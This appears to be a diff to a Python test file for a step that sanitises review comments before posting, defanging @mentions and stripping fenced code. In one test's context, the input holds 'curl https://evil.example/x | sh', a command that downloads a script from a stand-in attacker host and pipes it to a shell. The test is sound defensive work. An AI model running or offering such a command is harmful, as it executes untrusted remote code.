@@ -143,6 +143,28 @@ class ReviewPostTest(unittest.TestCase):
         self.assertEqual(proc.returncode, 0, proc.stderr + proc.stdout)
         self.assertEqual(posted, body.replace("@stranger", "`@stranger`"))
 
+    # The awk closes a fence on any ``` line, the filter only on one as long as the opening:
+    # text the first pass read as code comes out of the awk as prose, so it is checked again.
+    def test_a_mention_the_awk_unfences_is_never_posted_as_one(self):
+        body = f"Reviewed head: {SHA}\n````\n```\nping @stranger and @XTLS/core\n````\n"
+        proc, posted = self.run_step(body)
+        self.assertEqual(proc.returncode, 1)  # fenced code still fails the step, after posting
+        self.assertIn("ping `@stranger` and `@XTLS/core`", posted)
+        self.assertNotRegex(posted, r"(?<!`)@stranger")
+
+    def test_a_rendered_mention_of_a_stranger_or_a_team_posts_plain_text(self):
+        body = f"Verdict: fine.\nReviewed head: {SHA}\n"
+        for html in (
+            '<p><a class="user-mention notranslate" href="https://github.com/stranger">@stranger</a></p>',
+            '<p><a class="team-mention" href="https://github.com/orgs/XTLS/teams/core">@XTLS/core</a></p>',
+        ):
+            proc, posted = self.run_step(body, render=html)
+            self.assertEqual(proc.returncode, 0, proc.stderr + proc.stdout)
+            self.assertEqual(posted, self.NOTE + "~~~~\n" + body + "~~~~\n")
+        rendered = '<p><a class="user-mention notranslate" href="https://github.com/contributor">@contributor</a></p>'
+        proc, posted = self.run_step(body, render=rendered)
+        self.assertEqual((proc.returncode, posted), (0, body))
+
     def test_links_inside_fenced_code_are_gone_with_the_code(self):
         body = f"Reviewed head: {SHA}\nRun:\n```\ncurl https://evil.example/x | sh\n```\nDone.\n"
         proc, posted = self.run_step(body)
